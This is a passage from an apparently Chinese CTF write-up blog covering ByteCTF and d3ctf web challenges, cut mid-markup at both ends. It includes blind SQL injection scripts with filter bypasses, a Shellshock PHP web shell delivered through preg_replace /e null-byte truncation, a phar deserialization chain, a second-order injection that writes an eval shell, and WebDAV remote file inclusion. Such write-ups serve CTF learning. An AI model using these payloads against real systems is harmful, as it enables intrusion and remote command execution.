class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">anti_disturb_key=<span class="string">&#x27;cjb_ccreater_s_test&#x27;</span></span><br><span class="line">PHPSESSID=<span class="string">&#x27;404i3uiletdpke9rb0egs7vf47&#x27;</span></span><br><span class="line">check_article_id=<span class="number">20</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">check_title</span>):</span></span><br><span class="line">    url=<span class="string">&#x27;http://112.125.24.134:9999/edit.php?id=&#x27;</span>+<span class="built_in">str</span>(check_article_id)</span><br><span class="line">    res=requests.get(url,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:PHPSESSID&#125;)</span><br><span class="line">    bs=BeautifulSoup(res.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    title=bs.find(<span class="string">&#x27;input&#x27;</span>,attrs=&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&quot;title&quot;</span>&#125;)[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    content=bs.find(<span class="string">&#x27;textarea&#x27;</span>,attrs=&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&quot;content&quot;</span>&#125;).text</span><br><span class="line">    <span class="keyword">if</span> title[:<span class="built_in">len</span>(anti_disturb_key)]!=anti_disturb_key :</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;disturb&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> content!=<span class="string">&#x27;success&#x27;</span>+check_title:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;false&#x27;</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_write</span>(<span class="params">title,info</span>):</span></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span>:title,</span><br><span class="line">        <span class="string">&#x27;content&#x27;</span>:info</span><br><span class="line">    &#125;</span><br><span class="line">    url=<span class="string">&#x27;http://112.125.24.134:9999/writing.php&#x27;</span></span><br><span class="line">    res=requests.post(url,data=data,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:PHPSESSID&#125;)</span><br><span class="line">    <span class="keyword">if</span> res.status_code==<span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_newest_id</span>():</span></span><br><span class="line">    url=<span class="string">&#x27;http://112.125.24.134:9999/index.php&#x27;</span></span><br><span class="line">    res=requests.get(url,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:PHPSESSID&#125;)</span><br><span class="line">    bs=BeautifulSoup(res.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    newest_id=bs.find(<span class="string">&#x27;article&#x27;</span>).find(<span class="string">&#x27;footer&#x27;</span>).find(<span class="string">&#x27;a&#x27;</span>)[<span class="string">&#x27;href&#x27;</span>]</span><br><span class="line">    newest_id=newest_id[newest_id.index(<span class="string">&#x27;=&#x27;</span>)+<span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(newest_id)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_inject</span>(<span class="params">sql</span>):</span></span><br><span class="line">    title=anti_disturb_key+<span class="string">&quot;&#x27; or (id=&quot;</span>+<span class="built_in">str</span>(check_article_id)+<span class="string">&quot; and (&quot;</span>+sql+<span class="string">&#x27;))#&#x27;</span></span><br><span class="line">    info=<span class="string">&#x27;success&#x27;</span>+title</span><br><span class="line">    <span class="keyword">if</span> make_write(title,info):</span><br><span class="line">        <span class="comment">#编辑id=newest_id的文章来读取$raw[&#x27;title&#x27;]</span></span><br><span class="line">        newest_id=get_newest_id()</span><br><span class="line">        url=<span class="string">&#x27;http://112.125.24.134:9999/edit.php&#x27;</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;title&#x27;</span>:title,</span><br><span class="line">            <span class="string">&#x27;content&#x27;</span>:info,</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>:newest_id</span><br><span class="line">        &#125;</span><br><span class="line">        res=requests.post(url,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:PHPSESSID&#125;,data=data)</span><br><span class="line">        <span class="comment">#判断盲注结果</span></span><br><span class="line">        result=check(title)</span><br><span class="line">        <span class="keyword">if</span> result==<span class="string">&#x27;success&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> result==<span class="string">&#x27;disturb&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;受到干扰,重新执行&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> sql_inject(sql)</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;程序执行错误,请保持结果&#x27;</span>)</span><br><span class="line">        <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&#x27;执行命令:&#x27;</span>))</span><br><span class="line">    </span><br><span class="line"><span class="comment">#demo </span></span><br><span class="line"><span class="comment">#sql=&#x27;(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),index,1)))=guess&#x27;</span></span><br><span class="line">sql=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">(select&#x27;&#x27;+conv(substr(hex(group_concat(table_name)),index,1),16,10) FROM information_schema.tables WHERE TABLE_SCHEMA=&#x27;information_schema&#x27;)=guess </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">### 数据库名:696e666f726d6174696f6e5f736368656d612c62616279626c6f67</span></span><br><span class="line"><span class="comment">#猜information_schema表名</span></span><br><span class="line"><span class="comment">#vip用户:wulaxc4ca4238a0b923820dcc509a6f75849b</span></span><br><span class="line">result=<span class="string">&quot;4348415241435445525F534554532C434F4C4C4154494F4E532C434F4C4C4154494F4E5F4348415241435445525F5345545F4150504C49434142494C4954592C434F4C554D4E532c434f4c554d4e5f50524956494c454745532c454e47494e45532c4556454e54532c46494c45532c474c4f42414c5f5354415455532c474c4f42414c5f5641524941424c45532c4b45595f434f4c554d4e5f55534147452c504152414d45544552532c504152544954494f4e532c504c5547494e532c50524f434553534c4953542c50524f46494c494e472c5245464552454e5449414c5f434f4e53545241494e54532c524f5554494e45532c534348454d4154412c534348454d415f50524956494c454745532c53455353494f4e5f5354415455532c53455353494f4e5f5641524941424c45532c535441544953544943532c5441424c45532c5441424c455350414345532c5441424c455f434f4e53545241494e54532c5441424c455f50524956494c454745532c54524947474552532c555345525f50524956494c454745532c&quot;</span></span><br><span class="line"></span><br><span class="line">index=<span class="built_in">len</span>(result)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    index+=<span class="number">1</span></span><br><span class="line">    temp=sql.replace(<span class="string">&#x27;index&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;猜测第&quot;</span>+<span class="built_in">str</span>(index)+<span class="string">&quot;位为:&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">if</span> sql_inject(temp.replace(<span class="string">&#x27;guess&#x27;</span>,<span class="built_in">str</span>(i))):</span><br><span class="line">            result+=<span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    res=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(result),<span class="number">2</span>):</span><br><span class="line">        res+=<span class="built_in">chr</span>(<span class="built_in">int</span>(result[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">        </span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>filter=<code>(SELECT|DELETE)@&#123;0,2&#125;(\\(.+\\)|\\s+?.+?\\s+?|(</code>|’|&quot;).<em>?(<code>|&#39;|\&quot;)|(\+|-|~|!|@:=|&quot; . urldecode(&#39;%0B&#39;) . &quot;).+?)FROM(\\(.+\\)|\\s+?.+?|(</code>|’|&quot;).</em>?(<code>|&#39;|\&quot;))</code><br>ban掉了select 语句<br>如果拿到vip权限可以用替换绕过<br><code>(select&#39;&#39;+conv(substr(hex(group_concat(table_name)),index,1),16,10) FROM information_schema.tables WHERE TABLE_SCHEMA=database())=guess </code>绕过正则过滤</p>
<p>拿到vip账号:wulax,密码:1,网址:<a target="_blank" rel="noopener" href="http://112.126.101.16:9999/">http://112.126.101.16:9999</a></p>
<p>看到replace.php里的preg_replace()猜测突破点在这里,利用<code>/e%00</code>来截断末尾的斜杠,从而达到命令执行的效果</p>
<p>命令执行利用脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://112.126.101.16:9999&quot;</span></span><br><span class="line">arc_id=<span class="string">&quot;11&quot;</span></span><br><span class="line">session=<span class="string">&quot;5lrk8g0oh73su3q9dbfp9l79f2&quot;</span></span><br><span class="line">text=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;?php </span></span><br><span class="line"><span class="string"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span></span><br><span class="line"><span class="string"># Google Dork: none </span></span><br><span class="line"><span class="string"># Date: 10/31/2014 </span></span><br><span class="line"><span class="string"># Exploit Author: Ryan King (Starfall) </span></span><br><span class="line"><span class="string"># Vendor Homepage: http://php.net </span></span><br><span class="line"><span class="string"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span></span><br><span class="line"><span class="string"># Version: 5.* (tested on 5.6.2) </span></span><br><span class="line"><span class="string"># Tested on: Debian 7 and CentOS 5 and 6 </span></span><br><span class="line"><span class="string"># CVE: CVE-2014-6271 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function shellshock($cmd) &#123; // Execute a command via CVE-2014-6271 @mail.c:283 </span></span><br><span class="line"><span class="string">   $tmp = tempnam(&quot;.&quot;,&quot;data&quot;); </span></span><br><span class="line"><span class="string">   $headers =  &#x27;MIME-Version: 1.0&#x27; . &quot;\r\n&quot;; </span></span><br><span class="line"><span class="string">	$headers .= &#x27;From: Your name &lt;info@address.com&gt;&#x27; . &quot;\r\n&quot;;</span></span><br><span class="line"><span class="string">	$headers .= &#x27;Content-type: text/html; charset=iso-8859-1&#x27; . &quot;\r\n&quot;; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   putenv(&quot;PHP_LOL=() &#123; x; &#125;; $cmd &gt;$tmp 2&gt;&amp;1&quot;); </span></span><br><span class="line"><span class="string">   // In Safe Mode, the user may only alter environment variableswhose names </span></span><br><span class="line"><span class="string">   // begin with the prefixes supplied by this directive. </span></span><br><span class="line"><span class="string">   // By default, users will only be able to set environment variablesthat </span></span><br><span class="line"><span class="string">   // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, </span></span><br><span class="line"><span class="string">   // PHP will let the user modify ANY environment variable! </span></span><br><span class="line"><span class="string">   mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,$headers,&quot;-bv&quot;); // -bv so we don&#x27;t actuallysend any mail </span></span><br><span class="line"><span class="string">   $output = @file_get_contents($tmp); </span></span><br><span class="line"><span class="string">   @unlink($tmp); </span></span><br><span class="line"><span class="string">   if($output != &quot;&quot;) return $output; </span></span><br><span class="line"><span class="string">   else return &quot;No output, or not vuln.&quot;; </span></span><br><span class="line"><span class="string">&#125; </span></span><br><span class="line"><span class="string">echo shellshock($_REQUEST[&quot;cmd&quot;]); </span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>():</span></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;title&quot;</span>:<span class="string">&quot;bbb&quot;</span>,</span><br><span class="line">        <span class="string">&quot;content&quot;</span>:<span class="string">&quot;b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;id&quot;</span>:arc_id</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> requests.post(url+<span class="string">&quot;/edit.php&quot;</span>,data=data,cookies=&#123;<span class="string">&quot;PHPSESSID&quot;</span>:session&#125;)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec</span>(<span class="params">s</span>):</span></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;replace&quot;</span>:s,<span class="comment">#&quot;var_dump(scandir(&#x27;/tmp&#x27;));var_dump(file_put_contents(&#x27;/tmp/aaa.php&#x27;,&quot;+&quot;$_POST[&#x27;cmd&#x27;]&quot;+&quot;));&quot;,</span></span><br><span class="line">        <span class="string">&quot;regex&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;id&quot;</span>:arc_id,</span><br><span class="line">        <span class="string">&quot;find&quot;</span>:<span class="string">&quot;b/e\x00&quot;</span>,</span><br><span class="line">        <span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;ls -al&quot;</span>,</span><br><span class="line">        <span class="string">&quot;filepath&quot;</span>:<span class="string">&quot;/tmp/hpdoger.php&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result=requests.post(url+<span class="string">&quot;/replace.php&quot;</span>,data=data,cookies=&#123;<span class="string">&quot;PHPSESSID&quot;</span>:session&#125;)</span><br><span class="line">    edit()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">exec</span>(<span class="built_in">input</span>()).text)</span><br></pre></td></tr></table></figure>

<p>emmmm..到这里就不会做了.到头了.</p>
<p>后来发现有个antsystem()</p>
<p>vardump(antsystem(‘/readfile’));</p>
<h3 id="ezcms"><a href="#ezcms" class="headerlink" title="ezcms"></a>ezcms</h3><p>哈希扩展攻击拿到admin权限</p>
<p>代码审计发现</p>
<p>在config.php下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filepath</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$filepath</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filepath = <span class="variable">$filepath</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;checker))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;upload_file();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_detail</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i&#x27;</span>, <span class="keyword">$this</span>-&gt;filepath))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonono~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$mine</span> = mime_content_type(<span class="keyword">$this</span>-&gt;filepath);</span><br><span class="line">        <span class="variable">$store_path</span> = <span class="keyword">$this</span>-&gt;open(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;filepath);</span><br><span class="line">        <span class="variable">$res</span>[<span class="string">&#x27;mine&#x27;</span>] = <span class="variable">$mine</span>;</span><br><span class="line">        <span class="variable">$res</span>[<span class="string">&#x27;store_path&#x27;</span>] = <span class="variable">$store_path</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤phar并且明明没有给<code>$checker</code>赋值的点,在销毁的时候却会调用它,明显是一个为了出题而写的地方猜测phar反序列化利用,而mime_content_type()恰好又是反序列化的利用点</p>
<p>最后在view.php处找到调用view_detail的地方</p>
<p>由于题目不限制.php文件的上传,但是题目会写一个非法.htaccess</p>
<p>所以我们可以可以试着删除它</p>
<p>构造pop链:</p>
<p><code>FILE::view_detail(mime_content_type)-&gt;FILE::__destruct(upload_file())-&gt;Profile::__call(open())-&gt;ZipArchive::open(file,ZipArchive::OVERWRITE)</code></p>
<p>phar文件生成后就是要考虑如何绕过<code>(^phar)</code>的限制,</p>
<p>我觉得这才是这一题最骚的地方:</p>
<p><code>filepath=php://filter/resource=phar://sandbox/a87136ce5a8b85871f1d0b6b2add38d2/dd7ec931179c4dcb6a8ffb8b8786d20b.txt</code></p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><p>这次最开心的就是做misc的题目</p>
<h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><h3 id="betgame"><a href="#betgame" class="headerlink" title="betgame"></a>betgame</h3><p>发现猜拳规律</p>
<p>计算机第一次出与被显示的选择克制的选择(显示:s,实际出:j)</p>
<p>计算机第二次出与克制显示的选择的选择(显示:s,实际出:b)</p>
<p>计算机第三次出显示的选择(显示:s,实际出:s)</p>
<p>然后手动pk :D</p>
<h3 id="jigsaw"><a href="#jigsaw" class="headerlink" title="jigsaw"></a><strong>jigsaw</strong></h3><p><img src="https://i.loli.net/2019/09/09/eDQhxkWYUsvZdVa.png" alt="image.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/04/19/bytectfwp/" data-id="ckw63s4lg003ofloldfokep9b" data-title="bytectf wp" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-d3ctf2019" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/04/19/d3ctf2019/" class="article-date">
  <time class="dt-published" datetime="2020-04-19T16:00:00.000Z" itemprop="datePublished">2020-04-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/04/19/d3ctf2019/">d3ctf</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="d3ctf"><a href="#d3ctf" class="headerlink" title="d3ctf"></a>d3ctf</h1><p>疯狂涨姿势，就很nice</p>
<h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p> <a target="_blank" rel="noopener" href="https://github.com/wqmsybpw/wqmsybpw.github.io/blob/1401b571d975fec748a84a47691e468187a80ef8/_posts/2019-11-25-2019d3ctf-writeup.md">https://github.com/wqmsybpw/wqmsybpw.github.io/blob/1401b571d975fec748a84a47691e468187a80ef8/_posts/2019-11-25-2019d3ctf-writeup.md</a> </p>
<p> <a target="_blank" rel="noopener" href="https://nikoeurus.github.io/2019/11/26/D^3ctf-Web/">https://nikoeurus.github.io/2019/11/26/D%5E3ctf-Web/</a> </p>
<p> <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193939#h3-4">https://www.anquanke.com/post/id/193939#h3-4</a> </p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ezweb"><a href="#ezweb" class="headerlink" title="ezweb"></a>ezweb</h3><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g97tefki11j30ao01s743.jpg" alt="image.png"></p>
<p>和username有关?</p>
<p>x  注册一个用户名为:<code>*/echo 1231231231;/*</code>的用户</p>
<p>二次注入,User 的index方法调用get_view</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9aly1g985asdayuj30pm027dfx.jpg" alt="image.png"></p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9aly1g985c901tuj30u208vmxr.jpg" alt="image.png"></p>
<p>利用替换{来绕过select 和 union的过滤,利用0x….来绕过{的过滤</p>
<p>最后的payload</p>
<p>注册一个用户名为<code>aaa&#39; unio&#123;n selec&#125;t 0x7B7B7068707D7D6576616C28245F504F53545B615D293B7B7B2F7068707D7D limit 1,1#</code>成功拿到shell权限</p>
<p> d3ctf{Th4at’s_A_Si11y_P0p_chi4n} </p>
<h3 id="fakeonlinephp"><a href="#fakeonlinephp" class="headerlink" title="fakeonlinephp"></a>fakeonlinephp</h3><p>报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Warning: include(): http:// wrapper is disabled in the server configuration by allow_url_include=0 in C:\Users\w1nd\Desktop\web\nginx-1.17.6\html\index.php on line 1</span><br><span class="line"></span><br><span class="line">Warning: include(http://39.108.164.219:60005/1.txt): failed to open stream: no suitable wrapper could be found in C:\Users\w1nd\Desktop\web\nginx-1.17.6\html\index.php on line 1</span><br><span class="line"></span><br><span class="line">Warning: include(): Failed opening &#x27;http://39.108.164.219:60005/1.txt&#x27; for inclusion (include_path=&#x27;.;C:\Users\Public\Videos;\c:\php\includes;c:\php\pear;&#x27;) in C:\Users\w1nd\Desktop\web\nginx-1.17.6\html\index.php on line 1</span><br></pre></td></tr></table></figure>

<p>虽然禁用了http协议,但是还是会发送请求</p>
<p>unc路径远程文件包含</p>
<p>一键启动一个webdav服务器</p>
<p><code>docker run -v /root/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 --rm --name webdav bytemark/webdav</code>然后把php文件放到/root/webdav/data里就行了</p>
<p><a target="_blank" rel="noopener" href="http://02f4483e31.fakeonelinephp.d3ctf.io/?orange=C:/Users/w1nd/AppData/Local/Temp/fffffffffuckccrf">http://02f4483e31.fakeonelinephp.d3ctf.io/?orange=C:/Users/w1nd/AppData/Local/Temp/fffffffffuckccrf</a></p>
<p>eval($_COOKIE[‘a’]);</p>
<p>whois</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Domain Name: D3CTF.IO</span><br><span class="line">Registry Domain ID: D503300001132938421-LRMS</span><br><span class="line">Registrar WHOIS Server: whois.namesilo.com</span><br><span class="line">Registrar URL: http://www.namesilo.com</span><br><span class="line">Updated Date: 2019-10-14T20:31:26Z</span><br><span class="line">Creation Date: 2019-08-15T11:56:00Z</span><br><span class="line">Registry Expiry Date: 2020-08-15T11:56:00Z</span><br><span class="line">Registrar Registration Expiration Date:</span><br><span class="line">Registrar: Namesilo, LLC</span><br><span class="line">Registrar IANA ID: 1479</span><br><span class="line">Registrar Abuse Contact Email: </span><br><span class="line">Registrar Abuse Contact Phone: +1.4805240066</span><br><span class="line">Reseller:</span><br><span class="line">Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited</span><br><span class="line">Registrant Organization: See PrivacyGuardian.org</span><br><span class="line">Registrant State/Province: AZ</span><br><span class="line">Registrant Country: US</span><br><span class="line">Name Server: DNS21.HICHINA.COM</span><br><span class="line">Name Server: DNS22.HICHINA.COM</span><br><span class="line">DNSSEC: unsigned</span><br><span class="line"></span><br><span class="line">The Registrar of Record identified in this output may have an RDDS service that can be queried </span><br><span class="line">for additional information on how to contact the Registrant, Admin, or Tech contact of the </span><br><span class="line">queried domain name.</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">本站数据：香港特别行政区 腾讯云</span><br><span class="line">参考数据1：香港 tencent.com</span><br><span class="line">参考数据2：美国</span><br><span class="line">兼容IPv6地址：::966D:4AEA</span><br><span class="line">映射IPv6地址：::FFFF:966D:4AEA</span><br></pre></td></tr></table></figure>



<p>whoami</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br><span class="line"></span><br><span class="line">USER INFORMATION</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">User Name       